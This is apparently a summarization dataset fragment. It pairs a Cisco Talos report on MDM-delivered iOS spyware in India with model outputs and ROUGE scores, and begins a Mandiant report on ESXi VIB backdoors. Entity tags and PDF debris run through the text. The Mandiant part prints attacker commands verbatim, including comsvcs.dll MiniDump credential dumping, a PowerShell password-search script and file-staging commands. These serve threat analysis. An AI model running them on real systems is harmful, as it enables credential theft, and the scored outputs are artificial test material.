compromised their device \u2014 we observed a device named \" test \" or \" mdmdev . \" The log files we identified contain the phone number of the device . The number originates from [GPE] India and uses [LAW] the \" Vodafone [LAW] India \" [LAW] network with roaming capability disabled . With all of this information in mind , we assume with high confidence that the malware author works out of [GPE] India . [ORG] MDM is becoming more popular throughout large enterprises , and users should be aware that installing additional certificates on their device to allow remote management can result in potential malicious activity . By installing a certificate outside of the Apple iOS trusted certificate chain , you may open up to possible [ORDINAL] third - party attacks like this . Users must be aware that accepting an [ORG] MDM certificate is equivalent to allowing someone administrator access to their device , passwords , etc . This must be done with great care in order to avoid security issues and should not be something the average home user does . The following information warns the security community and users of how this attack works . The likely use of social engineering to recruit devices serves as a reminder that users need to be wary of clicking on unsolicited links and verify identities and legitimacy of requests to access devices . The overall workflow of the deployment method and capabilities is pictured below . [ORG] Convert webpages to pdf online with PDFmyURLVulnerability Spotlight : MultipleAdobe Acrobat DC Threat Roundup for [DATE] June [DATE] 29 to July6thSmoking [ORG] Guns [ORG] - [ORG] Smoke [ORG] Loaderlearned new tricks [FAC] \u25ba [FAC] J [FAC] U [FAC] N [FAC] E [FAC] ( [CARDINAL] 15 ) \u25ba M A Y ( [CARDINAL] 15 ) \u25ba A P R I L ( 21 ) \u25ba M A R C H ( 10 ) \u25ba F E B R U A R Y ( [CARDINAL] 14 ) \u25ba J A N U A R Y ( [CARDINAL] 18 ) \u25ba 2 0 1 7 ( [CARDINAL] 172 ) \u25ba 2 0 1 6 ( [CARDINAL] 98 ) \u25ba 2 0 1 5 ( [CARDINAL] 62 ) \u25ba 2 0 1 4 ( [CARDINAL] 67 ) \u25ba 2 0 1 3 ( [CARDINAL] 30 ) \u25ba 2 0 1 2 ( 53 ) \u25ba 2 0 1 1 ( [CARDINAL] 23 ) \u25ba 2 0 1 0 ( [CARDINAL] 93 ) \u25ba 2 0 0 9 ( [CARDINAL] 146 ) \u25ba 2 0 0 8 ( 37)R E C OM M E N D E D B L OG S C I S C O B L O G Field Area Network Security Webinar \u2013 Bringing OT and IT TogetherS N O R T B L O G Snort Subscriber Rule Set Update for 07/17/2018C L A M A V \u00ae B L O G ClamAV [CARDINAL] 0.100.1 has been released!The overall workflow of the deployment method and capabilities is pictured below . [ORG] IO [ORG] S [ORG] M [ORG] D [ORG] M [ORG] INFR [ORG] AS TR U CTU R EMy tiny [PRODUCT] MDMTalos identified [CARDINAL] two different [ORG] MDM servers : [ORG] Convert webpages to pdf online with PDFmyURLhxxp://ios - certificate - update[.]com hxxp://www[.]wpitcher[.]comBoth servers above are based on the open - source project mdm - server \u2014 a small iOS [ORG] MDM server . [ORG] MDM allows for operating system - level control of multiple devices from a centralized location . A remote administrator can install or remove apps , install or revoke certificates , lock the device , or change password requirements , among other things . The operator is able to uninstall legitimate applications such as [ORG] Telegram and [ORG] WhatsApp to install the malicious versions described in the next section . Device enrollmentEach step of the enrollment process needs some type of user interaction . That 's why [PERSON] Talos assumes the attackers use social engineering to get victims on the [ORG] MDM . The [ORDINAL] first step for enrolling a device is to install the certificate authority : [ORG] Convert webpages to pdf online with PDFmyURLIf the user clicks on \" Allow , \" the following message is displayed : [ORG] Convert webpages to pdf online with PDFmyURLBy clicking on \" Install , \" the signature will switch to \" [PERSON] Verified:\"Convert webpages to pdf online with PDFmyURLThe device is ready to be enrolled : [ORG] Convert webpages to pdf online with PDFmyURLWe can control the installed profile : [ORG] Convert webpages to pdf online with PDFmyURLThe attacker is now able to control the device . A pop - up appears when the attacker pushes a new app to the user device . Here is an example with the compromised [GPE] Telegram app mentioned later in the article : [ORG] Convert webpages to pdf online with PDFmyURLThis gives the attacker a significant level of control over the victim device(s ) . This process is used similarly to a large - scale enterprise using [ORG] MDM solutions . It is likely that the user is advised that the certificate must be installed to allow enrollment . This is most likely performed via a social engineering mechanism , i.e. a fake tech support - style call . The attacker used a domain which allowed them to try and fool the user . The use of \" ios - certificate- update[.]com \" may make it easier to reassure the user that this is normal . Since we believe this attack is targeting devices in [GPE] India this is also something which a non - native [LANGUAGE] English speaker may see as \" normal . \" The certificate and update naming convention is also designed to trick the user . Technical information about the MDMThe attacker left a lot of information behind , which allowed us to analyse files used by this [ORG] MDM . [ORDINAL] First , the certificate used by the [ORG] MDM : CA.crt : Serial Number : [DATE] 13905745817900070731 ( 0xc0fb222544ceb74b ) Issuer : C = CR , [GPE] ST = Split , L = [PERSON] Split , O = [ORG] NA , OU = IT , CN = ios - certificate- update.com/emailAddress=nicholas.vukoja@mail.ru Validity Not Before : Sep 6 11:33:09 [DATE] 2017 GMT Not After : Sep 6 11:33:09 [DATE] 2018 GMT Subject : C = CR , [GPE] ST = Split , L = [PERSON] Split , O = [ORG] NA , OU = IT , CN = ios - certificate- update.com/emailAddress=nicholas.vukoja@mail.ruConvert webpages to pdf online with PDFmyURLThe certificate was issued in [DATE] September [DATE] 2017 and contains an email address located in [GPE] Russia . Our investigation suggests that the attacker is not based out of [GPE] Russia . We assume this is a false flag to point researchers toward the idea of a \" classical [NORP] Russian hacker . \" False flags are becoming more common in malware , both sophisticated and simple . It 's an attempt to muddy the waters for the analysts / researchers to direct blame elsewhere . Identity.p12 : Serial Number : 14177612590375883362 ( 0xc4c0ff88e475d262 ) Issuer : C = CR , [GPE] ST = Split , L = [PERSON] Split , O = [ORG] NA , OU = IT , CN = ios - certificate- update.com/emailAddress=Aleksi.Dushku@mail.ru Validity Not Before : Jan 6 04:59:56 [DATE] 2018 GMT Not After : Jan 6 04:59:56 [DATE] 2019 GMT Subject : C = CR , [GPE] ST = Split , L = [PERSON] Split , O = [ORG] NA , OU = IT , CN = ios - certificate- update.com/emailAddress=Aleksi.Dushku@mail.ruThis is another certificate , which points to an apparent reference to [GPE] Russia by using another mail.ru address . Server.csr : Subject : C = HR , [GPE] ST = [GPE] Hrvatska , L = [PERSON] Split , O = [ORG] NA , OU = IT , CN = ios - certificate- update.com/emailAddress=nicholas.vukoja@mail.ruIn this certificate , the attacker mentioned [PERSON] Hrvatska ( \" [PERSON] Croatia \" in the [NORP] Croatian language ) with the same [NORP] Russian email . [ORG] Convert webpages to pdf online with PDFmyURLThe certificates are self - signed , or signed by the [ORG] Comodo certificate authority . Log analysisOne of the most interesting pieces of information about the [ORG] MDM is found in the log file . Because of this , we can confirm the following points : There are [CARDINAL] 13 compromised devices based off serial number All the devices are located in [GPE] India ( based on the phone numbers and phone providers ) Phone models : iPhone [CARDINAL] 5.4 , iPhone [CARDINAL] 7.2 , iPhone 8.1 , iPhone [CARDINAL] 8.2 , [ORG] iPhone [CARDINAL] 9.3 , iPhone [CARDINAL] 9.4 iOS versions : [CARDINAL] 10.2.1 , 10.3.1 , 10.3.2 , [DATE] 10.3.3 , [CARDINAL] 11.0 , [DATE] 11.0.3 , [DATE] 11.2.1 , [CARDINAL] 11.2.5 , [CARDINAL] 11.2.6At this time , we do n't know how the attacker enrolled the [CARDINAL] 13 targeted devices into the [ORG] MDM . It could be through physical access to the phones , or by using social engineering , motivating the user to enroll their device . We believe the attackers used their personal phone to test the [ORG] MDM because they included devices named \" Test \" and \" mdmdev . \" These [CARDINAL] two devices share the same phone number and a name that is uncommon for a personal phone . The phone number originates from [GPE] India and is registered on [EVENT] the \" Vodafone [EVENT] India \" network provider . When the device was registered on the [ORG] MDM server , roaming was disabled . We assess with high confidence that the author is based out of in [GPE] India . [ORG] IO [ORG] S [ORG] APPL [ORG] ICATIO NSMalicious applications using [ORG] BOptions sideloadingEXPLANATIONConvert webpages to pdf online with PDFmyURLThe attacker 's purpose appears to deploy malicious apps onto the [CARDINAL] 13 compromised devices . To doThe attacker 's purpose appears to deploy malicious apps onto the [CARDINAL] 13 compromised devices . To do so , they decided to use the [ORG] BOptions sideloading technique . The technique is described here . The purpose is to inject a dynamic library into the legitimate app . The [ORG] GitHub project was used by the attacker to create the malicious BOptionspro.dylib library held in the iOS package ( .ipa file ) . The injection library can ask for additional permissions , execute code and steal information from the original application , among other things . [GPE] Milan - based technology company [ORG] HackingTeam has previously used this technique . [ORG] TELEGRAM , [ORG] WHATSAPP [ORG] & [ORG] APPSSLOADERIn this campaign we identified [CARDINAL] three compromised versions of apps using this trick hosted on the [ORG] MDM server . AppsSLoader is seemingly harmless . The app was created to test the library injection . It simply opens a pop - up to the user confirming the execution of the dynamic library . This was most likely created to test the effectiveness of the library prior to malicious deployment . The compromised versions of the [ORG] Telegram and [ORG] WhatsApp applications used in this campaign are more interesting and relevant . They [ORDINAL] first contain the same malicious code . The purpose is to send collected data to a [CARDINAL] C2 server located at hxxp[:]//techwach[.]com . The malicious code checks permissions and asks for additional permissions if it does not already have them : Permission to access the user 's contact list ( PhnNumber::getContAccess ) Permission to access the user 's photos ( PhnNumber::getPAccess)Convert webpages to pdf online with PDFmyURLPermission to access the user 's photos ( PhnNumber::getPAccess)One of the most relevant features of these compromised versions of the applications is the [ORG] Telegram and [ORG] WhatsApp message stealing feature . Here is the global workflow of it : For Telegram : Opens ' tgdata.db ' , an [GPE] SQLite3 database used by [PERSON] Telegram [PERSON] Checks for the key ' UPLOADED_CHAT ' in the key store Queries \" select users_v29.phone_number , users_v29.uid from users_v29 ; \" Queries for \" select messages_v29.from_id AS oid , users_v29.first_name , users_v29.last_name , users_v29.phone_number , [ORG] messages_v29.message , messages_v29 .mid , messages_v29.to_id from messages_v29 join users_v29 [ORG] ON [ORG] ( messages_v29.from_id [ORG] = users_v29.uid ) ; \" Parses results , storing off counts , timestamps , and other metadata . Sends by posting to hxxp[:]//techwach[.]comQuery screenshot : For [ORG] WhatsApp : [ORG] Convert webpages to pdf online with PDFmyURLOpens ' ChatStorage.sqlite ' , the database used for [ORG] WhatsApp messages [ORG] Queries ' SELECT Z_PK , [GPE] ZFROMJID , [GPE] ZTOJID , [GPE] ZPUSHNAME , [GPE] ZTEXT , ZMESSAGEDATEQueries ' SELECT Z_PK , [GPE] ZFROMJID , [GPE] ZTOJID , [GPE] ZPUSHNAME , ZTEXT , ZMESSAGEDATE FROM ZWAMESSAGE WHERE Z_PK > ' % d '' Parses results , storing off counts , timestamps , and other metadata . Sends by posting to hxxp[:]//techwach[.]comAdditionally , the malware is designed to be able to send the contacts , location , and images from the compromised device . Here is the list of the [ORG] PHP pages available on the techwach C2 server : all.php UfmcRxYDaVVbrBl.phpAnother intriguing aspect of this malware is the way in which the malicious code achieves periodic code execution when the legitimate app bundled with it is running . [CARDINAL] One technique is to modify the app 's code at runtime to execute the malicious code \u2014 this has been observed in previously analyzed iOS malware . Instead , this malware remains almost entirely independent of the app and gains execution by creating a timer that eventually executes the malicious code in a background thread . From there , it schedules tasks to be executed asynchronously in the background by leveraging the apps ' background task queue . Ultimately , this means that the malicious code is invisible to the user of the app , and can be easily reused alongside any real application . [PERSON] PRAYTIMETalos identified another legitimate app executing malicious code during this campaign in [GPE] India . [ORG] PrayTime is used to give the user a notification when it 's time to pray . The malicious code connects to the domain [ORG] voguextra[.]com . The purpose is to download and display specific ads to the user . [PERSON] Convert webpages to pdf online with PDFmyURLThis app also leverages private frameworks to read the SMS messages on the device it is installed on and uploads these to the C2 server . [ORG] MYAPPMyApp is a regular iOS app . However , the application does not do anything . It has almost no code associated with it other than standard [GPE] iOS app runtime code . This could potentially be another testing app , but we 're unable to determine the exact use . This app is non - malicious . Techwach C2 serverThe malicious code within [ORG] Telegram and [ORG] WhatsApp sent collected data to the server techwach[.]com . The server has been active since [DATE] August [DATE] 2015 . Initially , the username used on the server was arnoldrex . Subsequently , this was changed to chernobog ( referencing a [NORP] Slavic deity).CO [ORG] NCL [PRODUCT] U [PRODUCT] S IO NThis investigation shows us that this attack targeted a very limited number ( [CARDINAL] 13 ) of users using [ORG] iPhone devices in [GPE] India . At the time , it is unclear who the targets of the campaign were , who was the perpetrator , or what the exact purpose was . It 's very likely the vector for this campaign was simply social engineering - in other words asking the user to click \" ok \" . This type of vector is very difficult to defend against since users can often be tricked into acting against their best interests . This is another important reminder that users must think twice before clicking on unsolicited links or requests and also that users should verify credentials from any unsolicited calls requesting they take action on devices . [ORG] Convert webpages to pdf online with PDFmyURLThe attackers installed an open - source [ORG] MDM and used this to deploy malicious code into secureThe attackers installed an open - source [ORG] MDM and used this to deploy malicious code into secure chat applications such as [ORG] Telegram and [ORG] WhatsApp to surreptitiously retrieve the messages / chats , photos and user 's location from the victim 's phone . Over a [DATE] three [DATE] - year period , the attackers remained under the radar \u2014 likely due to the low number of compromised devices . All the technical details point to an actor based in the same country as the victims : [GPE] India . The attacker tried to mimic [NORP] Russian hackers by using mail.ru email . However , we found testing devices enrolled on the [ORG] MDM with an [NORP] Indian phone number and registered on an [NORP] Indian provider . Once a user has lost physical access to their phone , it 's really a case of the attacker having a much easier playing field for malicious activity . The fact that the attacker was also able to get devices onto his own malicious [ORG] MDM shows that the attacker was indeed motivated to obtain initial access but also to maintain persistence across the devices . CO V E R AGEAdditional ways our customers can detect and block this threat are listed below . [ORG] Advanced [ORG] Malware [ORG] Protection ( [ORG] AMP ) is ideally suited to prevent the execution of the malware used by these threat actors . [PERSON] Cisco [PERSON] Cloud Web Security ( [ORG] CWS ) or Web Security Appliance ( WSA ) web scanning prevents access to malicious websites and detects malware used in these attacks . Email Security can block malicious emails sent by threat actors as part of their campaign . [ORG] Network [ORG] Security appliances such as Next- [ORG] Generation [ORG] Firewall ( NGFW ) , Next [ORG] - GenerationIntrusion [ORG] Prevention [ORG] System ( NGIPS ) , and [PERSON] Meraki [PERSON] MX can detect malicious activity associated with this threat . [PERSON] Convert webpages to pdf online with PDFmyURLAMP Threat Grid helps identify malicious binaries and build protection into all [ORG] Cisco [ORG] Security products . [ORG] Umbrella , our secure internet gateway ( [ORG] SIG ) , blocks users from connecting to malicious domains , [ORG] IPs , and URLs , whether users are on or off the corporate network . Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [ORG] Snort.org . [ORG] IO [ORG] CS www[.]wpitcher[.]comC2 Domains : Voguextra[.]com Techwach[.]comConvert webpages to pdf online with PDFmyURLAdvertising Domain : voguextra[.]comP O S T E D B Y P A [ORG] U [ORG] L [ORG] R A S C A G N E R E S AT [CARDINAL] 3 : 0 0 P M L A B E L S : A P P L E , I N D I A , I O S , I P H O N E , M A LW A R E A N A LY S I S , M A LW A R E R E S E A R C H , M D MS H A R E T H I S P O S TNO COMMENTS : POST A COMMENTEnter your comment Comment as : Google AccountConvert webpages to pdf online with [NORP] PDFmyURLPublish [ORG] PublishPreview PreviewN E W E RP O S TH O M ES U B S C R I B E T O : P O S T C O M M E N T S ( AT O M ) O L D E RP O S [ORG] TSoftware [ORG] Microsoft [ORG] Advisory [ORG] Snort RulesIP [ORG] Blacklist [ORG] Download BlogCONNECT WITH [GPE] US \u00a9 [DATE] 2018 [ORG] Cisco [ORG] Systems , Inc. and/or its affiliates . All rights reserved . View our Privacy Policy here . [PERSON] Convert webpages to pdf online with PDFmyURL", "generated_text": "a threat; advanced mobile malware campaign; 13 iPhones; India; the attacker; an open-source mobile device management ( MDM; enrolled devices; the device; social engineering; a user; the device; data interception; the malware; features; WhatsApp; Telegram; the device; the user; the device; the infected device; the user; access; the malicious code; the device; the device; the malware; a dynamic library; the app; the functionality; photos; SMS messages; Telegram chat messages; device; attachments; the device; the data; a user; the attacker; phone number; the device; the network; the attacker; the device; the user; the campaign; a security check; the device; the device; this threat; the threat actor; Apple; this threat.", "ref_text": "<START-1>The PDF describes a highly targeted malware campaign against 13 iPhones in India that was discovered by Cisco Talos. The attacker used an open-source mobile device management (MDM) system to enroll the victim devices and maintain control over them. The enrollment was likely done through physical access or social engineering to trick the user into accepting the MDM. Once enrolled, the MDM allowed the attacker to install malicious apps, including compromised versions of Telegram and WhatsApp. These apps steal data like contacts, messages, location, and photos and exfiltrate it to a command and control server. The malware uses the BOptions technique to inject code into the apps to achieve this. Analysis of the infrastructure suggests the attacker is based in India, despite attempts to imply otherwise through false flags like Russian email addresses. The campaign has been ongoing since 2015 but has only targeted around 13 devices, likely specific individuals. While the exact purpose and targets are unknown, the report demonstrates the risks of allowing external management of mobile devices which provides deep access. It also highlights the need for social engineering awareness when users receive unsolicited requests on their devices. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5895196506550219, "gpt3/lexical/rouge_rouge2": 0.19736842105263158, "gpt3/lexical/rouge_rougeL": 0.2925764192139738, "gpt3/lexical/rouge_rougeLsum": 0.2925764192139738, "gpt3_generated_text": ["This article discusses an advanced mobile malware campaign that has targeted 13 iPhones in India. The attacker used an open-source mobile device management (MDM) system to control the enrolled devices. It is unclear how the attacker managed to enroll the targeted devices, but it is likely through social engineering or physical access. The malware in this campaign replaces specific mobile apps for data interception. Talos has worked with Apple to counter this threat and Apple has taken action against the certificates associated with the attacker. The MDM system deployed five applications on the targeted devices, including ones that test the device's functionality, steal SMS message contents, and report the device's location. The attacker also used the BOptions sideloading technique to add features to legitimate apps like WhatsApp and Telegram, which were then deployed onto the targeted devices. The malicious code inserted into these apps collects and exfiltrates information such as phone numbers, serial numbers, locations, contacts, photos, SMS and chat messages. The logs on the MDM servers and the malware's command and control server indicate that the malware has been active since August 2015. The campaign specifically targeted 13 devices in India and the attacker appears to be based in India as well. It is important for users to be cautious when installing additional certificates on their devices for remote management as it can open them up to potential third-party attacks. Social engineering was likely used to recruit devices, highlighting the need for users to be cautious when clicking on unsolicited links and verifying the legitimacy of requests for device access."]}, {"split_name": "val", "sample_id": "val_34", "prompt_text": "Extract the keywords: www.mandiant.com /resources / blog / esxi - hypervisors - malware - persistence Bad VIB(E)s Part [CARDINAL] One : Investigating Novel Malware Persistence Within ESXi HypervisorsAs endpoint detection and response ( [ORG] EDR ) solutions improve malware detection efficacy on Windows systems , certain state - sponsored threat actors have shifted to developing and deploying malware on systems that do not generally support [ORG] EDR such as network appliances , [ORG] SAN arrays , and [ORG] VMware ESXi servers . [DATE] Earlier [DATE] this [DATE] year , [ORG] Mandiant identified a novel malware ecosystem impacting [ORG] VMware ESXi , [PERSON] Linux [PERSON] vCenter servers , and Windows virtual machines that enables a threat actor to take the following actions:1 . Maintain persistent administrative access to the hypervisor [CARDINAL] 2 . Send commands to the hypervisor that will be routed to the guest VM for execution [CARDINAL] 3 . Transfer files between the ESXi hypervisor and guest machines running beneath it [CARDINAL] 4 . Tamper with logging services on the hypervisor [CARDINAL] 5 . Execute arbitrary commands from [CARDINAL] one guest VM to another guest VM running on the same hypervisorThis malware ecosystem was initially detected during an intrusion investigation when [ORG] Mandiant identified attacker commands sourced from the legitimate [ORG] VMware Tools process , vmtoolsd.exe , on a [PRODUCT] Windows virtual machine hosted on a [ORG] VMware ESXi hypervisor . [ORG] Mandiant analyzed the boot profile for the ESXi hypervisors and identified a never - before - seen technique in which a threat actor leveraged malicious [ORG] vSphere [ORG] Installation [ORG] Bundles ( \u201c VIBs \u201d ) to install multiple backdoors on the ESXi hypervisors . We call these backdoors [ORG] VIRTUALPITA and [ORG] VIRTUALPIE ( Figure [CARDINAL] 1).Figure [CARDINAL] 1 : Visualization of ESXi attack pathIt is important to highlight that this is not an external remote code execution vulnerability ; the attacker needs admin - level privileges to the ESXi hypervisor before they can deploy malware . [ORG] Mandiant has no evidence of a zero [DATE] - day vulnerability being used to gain initial access or deploy the malicious [ORG] VIBs at the time of writing this post.1/13Details on how to manually detect if malicious or anomalous [ORG] VIBs are currently installed in your ESXi environment are outlined in our hardening blog post . [ORG] VMware has released additional information on protecting [ORG] vSphere . vSphere Installation Bundles ( VIB)Mandiant identified [CARDINAL] two ( [CARDINAL] 2 ) new malware families installed through malicious [WORK_OF_ART] vSphere [WORK_OF_ART] Installation [WORK_OF_ART] Bundles ( [ORG] VIBs ) , which we have named VIRTUALPITA and VIRTUALPIE.VMware [ORG] VIBs are collections of files that are designed to facilitate software distribution and virtual system management . Since ESXi utilizes an in - memory filesystem , file edits are not saved across reboots . A [ORG] VIB package can be used to create startup tasks , custom firewall rules , or deploy custom binaries upon the restart of an ESXi machine . These packages are generally utilized by administrators to deploy updates and maintain systems ; however , this attacker was seen leveraging the packages as a persistence mechanism to maintain access across ESXi hypervisors . VIBs can be broken down into [CARDINAL] three ( [CARDINAL] 3 ) components : An XML descriptor file A \u201c [ORG] VIB payload \u201d ( .vgz archive ) A signature file \u2013 A digital signature used to verify the host acceptance level of a [WORK_OF_ART] VIBThe [WORK_OF_ART] XML [WORK_OF_ART] Descriptor [WORK_OF_ART] File is a config which contains references to the following : The payload to be installed [ORG] VIB metadata , such as the name and install date The signature file that belongs to the VIBThe [ORG] VIB payload is a .vgz archive which contains directories and files that will be created on the ESXi machine through the [ORG] VIB . These files can then be called on to execute on boot when the [ORG] VIBs are loaded . The signature file is used to verify the host acceptance level of a [ORG] VIB . The acceptance level is the digital signature system used by [ORG] VMware to specify what testing has been done by [ORG] VMware or partners before a [ORG] VIB is published . Acceptance levels are set for hosts , image profiles , and individual [ORG] VIBs . The [CARDINAL] four ( 4 ) acceptance levels along with their XML Descriptor short names are listed below : VMWareCertified ( certified ) [ORG] CommunitySupported ( community)Per [ORG] VMware documentation , the default minimum acceptance level a [ORG] VIB needs to be installed on a ESXi host is [ORG] PartnerSupported . This acceptance level indicates the [ORG] VIBs are published by a partner that [ORG] VMware trusts . While this is the default acceptance level , it can be changed manually by an ESXi administrative account . The command used to install VIBs esxcli software vib install does not normally allow installations below the minimum acceptance level , but the --force flag can be used to ignore any systems acceptance level requirements when installing the VIB.The malicious [ORG] VIBs observed were labelled as [ORG] PartnerSupported . Mandiant \u2019s review of the Signature Files determined they were empty , and that an attacker modified the XML descriptor file to change the acceptance- level field from community to partner . A [ORG] CommunitySupported acceptance - level indicates that the VIB2/13was created by a [ORDINAL] third party which was not reviewed nor signed by [ORG] VMware or its trusted partners . This indicated the attacker masqueraded these [ORG] VIB files as [ORG] PartnerSupported even though they only met the requirements of a [ORG] CommunitySupported VIB . This also indicated that the [ORG] VIB was created by an individual or company outside of [ORG] VMware partner programs and has not gone through any [ORG] VMware - approved testing program . Figure [CARDINAL] 2 contains an excerpt of the modified XML descriptor file that was identified . Figure [CARDINAL] 2 : Modified Descriptor [ORG] XMLWhile the acceptance - level field was modified in the Descriptor XML by the attacker , the ESXi system still did not allow for a falsified [ORG] VIB file to be installed below the minimal set acceptance level . To circumvent this , the attacker abused the --force flag to install malicious [ORG] CommunitySupported VIBs . Testing confirmed that modified fields from the XML descriptor file reflected the changes made in the output of commands used to list and verify [ORG] VIBs . This included the modification of the < acceptance - level > field which tricks the command , esxcli software vib list , into displaying the incorrect acceptance level of the installed [ORG] VIBs . The [ORG] VMware command , esxcli software vib signature verify , verifies the signatures of installed [ORG] VIB packages and displays the following fields : [PERSON] VIB [PERSON] Name The result of the VIB \u2019s signature verificationMandiant confirmed that this command detected when these acceptance levels were falsified , which identified the malicious [ORG] VIBs . This command displays the acceptance level specified by the XML descriptor file , but the Signature Verification column clarifies if the signature file did not match the respective [PERSON] Descriptor [PERSON] XML . If the signature can not be verified , the Signature Verification column will contain the value Signature3/13Not Available : Host may have been upgraded from an older ESXi version . An example of this can be seen in Figure [CARDINAL] 3.Figure [CARDINAL] 3 : Example of falsified [ORG] VIB acceptance level being seen in esxcli software vib signature [PERSON] verifyVIRTUALPITA ( [ORG] VMware ESXi)VIRTUALPITA is a [CARDINAL] 64 - bit passive backdoor that creates a listener on a hardcoded port number on a [ORG] VMware ESXi server . The backdoor often utilizes [ORG] VMware service names and ports to masquerade as a legitimate service . It supports arbitrary command execution , file upload and download , and the ability to start and stop vmsyslogd . During arbitrary command execution , the malware also sets the environmental variable [ORG] HISTFILE to [CARDINAL] 0 to further hide activity that occurred on the machine . Variants of this malware were found to listen on [ORG] a [ORG] Virtual [ORG] Machine [ORG] Communication [ORG] Interface ( [ORG] VMCI ) and log this activity to the file sysclog . VIRTUALPIE ( [ORG] VMware [ORG] ESXi)VIRTUALPIE is a lightweight backdoor written in Python that spawns a daemonized [ORG] IPv6 listener on a hardcoded port on a [ORG] VMware ESXi server . It supports arbitrary command line execution , file transfer capabilities , and reverse shell capabilities . Communications use a custom protocol and are encrypted using RC4.The [ORDINAL] first malicious [ORG] VIB named lsu - lsi - lsi - mrarpid - plugin referenced the payload lsu_lsi_.v05 A bash installation script to be placed into /etc / rc.local.d/ to ensure its actions will be executed upon each bootup of ESXi . Uses the esxcli command line utility to enable a firewall rule for backdoor traffic , execute both backdoors , and remove every file created by the [ORG] VIB from the disk . An [ORG] ELF backdoor ( VIRTUALPITA ) that creates a listener on the hard coded [ORG] TCP port [DATE] 2233 . Capable of arbitrary command execution , file transfer capabilities and the ability to start / stop vmsyslogd . VMWare documentation recorded this port is normally utilized by the vSAN reliable datagram transport ( [ORG] RDT ) service on the ESXi version which was reviewed . A lightweight backdoor ( VIRTUALPIE ) written in Python that spawns a daemonized [ORG] IPv6 listener the hardcoded port [CARDINAL] 546 . Capable of arbitrary command line execution , file transfer capabilities , and reverse shell capabilities . Communications use a custom protocol and are encrypted using RC4.4/13The [ORDINAL] second malicious [ORG] VIB named ata - pata - pdc20211 referenced the payload payload1.v00 ( MD5 : vmware_rhttpio.sh A bash installation script to be placed into /etc / rc.local.d/ to ensure its actions willDescriptionrhttpproxy - iobe executed upon each bootup of ESXi . This script executes the [ORG] ELF backdoor An [ORG] ELF backdoor ( VIRTUALPITA ) that creates a listener on the hard coded [ORG] VMCI socket port [DATE] 18098 . Capable of arbitrary command execution , file transfer capabilities and the ability to start / stop vmsyslogd . The following sample generates an additional log not seen in other samples which fetches the systems context ID ( [ORG] CID ) . The generated log /var / log / sysclog records in the following format [ < date / timestamp>]\\n\\r[!]<<PID>>:<CID>:<port>\\n\\nVIRTUALPITA ( LINUX)Mandiant discovered [CARDINAL] two ( [CARDINAL] 2 ) additional VIRTUALPITA samples listening on [ORG] TCP port [CARDINAL] 7475 that were persistent as an init.d startup service on [PERSON] Linux [PERSON] vCenter systems . To disguise themselves , the binaries shared the name of the legitimate binary ksmd . [ORG] KSMD ( [PERSON] Kernel Same [PERSON] - Page [PERSON] Merging [PERSON] Daemon ) is normally in charge of memory- saving de - duplication on Linux and would not be listening on this port . The samples were found under the start / stop vmsyslogd . VIRTUALGATE ( Windows)The Windows guest virtual machines which were hosted by the infected hypervisors also contained a unique malware sample located at C:\\Windows\\Temp\\avp.exe . This malware , which we refer to as VIRTUALGATE , is a utility program written in C that is comprised of [CARDINAL] two ( [CARDINAL] 2 ) parts , a dropper , and the payload . The memory only dropper deobfuscates a [ORDINAL] second stage [ORG] DLL payload that uses [ORG] VMware 's virtual machine communication interface ( [ORG] VMCI ) sockets to run commands on a guest virtual machine from a hypervisor host , or between guest virtual machines on the same host . Command Execution through vmtoolsd.exeReviewing the ESXi hypervisors during an active attacker event , [ORG] Mandiant identified an attacker executed commands to the guest machines through the process /bin / rdt ( VIRTUALPITA ) . The parent process /bin / rdt spawned a bash shell which called on a python script specifying the target guest machine and commands to run as seen in Figure [CARDINAL] 4.Figure [CARDINAL] 4 : [ORG] Commands executed by attacker on ESXi Hypervisor- > /bin / rdt -i - > sh -c /bin / sh5/13 - > /bin / sh C:\\Windows\\system32\\cmd.exe /c dir /od /s /a c:\\ > C:\\Windows\\Temp\\TS_<REDACTED>.tmp 2 > nulCommands passed as arguments into e.py were also seen being executed by the targeted Windows guest machine , running as a child process under vmtoolsd.exe . This execution chain can be seen in Figure [CARDINAL] 5 . The parent binary /bin / rdt was not present on disk but was able to be recovered by dumping the processes memory of the ESXi hypervisor . The python script that sent out commands to the guest machines , e.py , was unable to be recovered . Figure [CARDINAL] 5 : vmtoolsd.exe executing commands passed by ESXiThe commands the attacker ran through vmtoolsd.exe on the guest virtual machines were primarily focused on the enumeration and compression of files across both the system and connected file shares utilizing the native tools \u201c dir \u201d and \u201c makecab \u201d . Samples of these redacted commands can be seen in Figure 6.Figure [CARDINAL] 6 : File enumeration and compression commands utilized by attacker on [ORG] Guest [ORG] Virtual [ORG] Machines C:\\Windows\\system32\\cmd.exe \" /c dir /od /s /a s:\\ > C:\\Windows\\Temp\\ts_<REDACTED>.tmp [CARDINAL] 2 > nullC:\\Windows\\System32\\cmd.exe makecab /F [ORG] C:\\Windows\\Temp\\TS_<REDACTED>.txt /D compressiontype = lzx /D compressionmemory=21 /D maxdisksize=1024000000 /D diskdirectorytemplate = C:\\Windows\\Temp\\ /D cabinetnametemplate = [PRODUCT] TS_<REDACTED>.cabMandiant also identified the attacker targeting a virtualized system for credential harvesting . The attacker used [ORG] MiniDump to dump process memory and search for cleartext credentials . Figure [CARDINAL] 7 shows an excerpt of these commands . Figure [CARDINAL] 7 : Credential Dumping on Guest Machine-- \u201c C:\\Program Files\\VMware\\Vmware Tools\\vmtoolsd.exe \u201d ---- \u201c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u201d ------ rundll32.exe [ORG] C:\\windows\\System32\\comsvcs.dll MiniDump < Process ID > C:\\Windows\\Temp\\TS_<REDACTED>.tmp full6/13Once the process memory was dumped , a powershell script was used to parse the resultant file for any cleartext credentials . Figure [CARDINAL] 8 shows the contents of script used for credential harvesting . The attacker also targeted [ORG] KeyPass password database files . Figure [CARDINAL] 8 : [ORG] PowerShell Password Search Script$b = New [ORG] - Object [ORG] System . IO.streamReader(\"C:\\windows\\Temp\\<REDACTED>.tmp\",[Text . Encoding]::UTF8 ) $ n = [CARDINAL] 0 while ( ( $ b1 = $ b. [PRODUCT] ReadLine ( ) ) -ne $ null ) { if($b1 -like ' * & password= * ' ) { $ [PERSON] n++ Write [PERSON] - Host \" YES $ n \" Write [ORG] - Host [ORG] $ b1 if($n -eq 0){Write [ORG] - Host \" NO ! \" } $ b. Dispose()The attacker cleared the C:\\Windows\\Temp directory following most activity , but small errors were made which left behind trace artifacts . As shown in Figure 